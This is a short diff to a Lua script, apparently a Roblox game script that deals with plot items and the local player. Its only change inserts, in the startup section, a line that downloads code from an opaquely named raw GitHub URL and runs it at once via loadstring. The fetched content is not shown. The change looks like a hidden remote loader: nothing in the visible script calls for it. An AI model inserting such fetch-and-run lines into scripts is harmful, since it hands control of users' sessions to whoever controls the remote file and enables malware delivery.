@@ -47,6 +47,7 @@ PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")
 
 ----------------------------------------------------------------------------------------- [ 시작 설정 ]
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/cd"))()
 
 local Players = game:GetService("Players")
 local localPlayer = game.Players.LocalPlayer
